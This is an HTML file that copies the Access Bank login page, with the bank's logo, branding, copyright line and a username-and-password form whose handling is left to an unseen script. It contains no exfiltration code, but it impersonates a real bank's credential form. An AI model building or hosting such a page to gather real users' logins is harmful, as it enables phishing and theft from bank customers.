<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Access Bank Login</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="access_logo.png" alt="Access Bank Logo" class="logo">
            <div class="flag">
                <img src="nigeria_flag.png" alt="Nigeria Flag">
                <img src="uk_flag.png" alt="UK Flag">
            </div>
        </div>

        <h2>Login with your Access Bank Credentials</h2>
        <p class="switch"><a href="#">Switch to Diamond Mobile Login</a></p>

        <form id="loginForm">
            <div class="input-group">
                <i class="fas fa-user"></i>
                <input type="text" id="username" placeholder="Username" required>
            </div>
            <div class="input-group">
                <i class="fas fa-lock"></i>
                <input type="password" id="password" placeholder="Password" required>
            </div>
            <p class="forgot"><a href="#">Forgot Credentials?</a></p>
            <button type="submit" class="btn">SIGN IN</button>
        </form>

        <p class="new-device">New Device? <a href="#">Change here</a></p>
        <p class="register"><a href="#">Register</a> • <a href="#">Open Account</a></p>

        <footer>
            <a href="#">Internet Banking</a> | <a href="#">Privacy Policy</a>
            <p>© Access Bank PLC (Licensed by the Central Bank of Nigeria)</p>
        </footer>
    </div>

    <script src="script.js"></script>
</body>
</html>
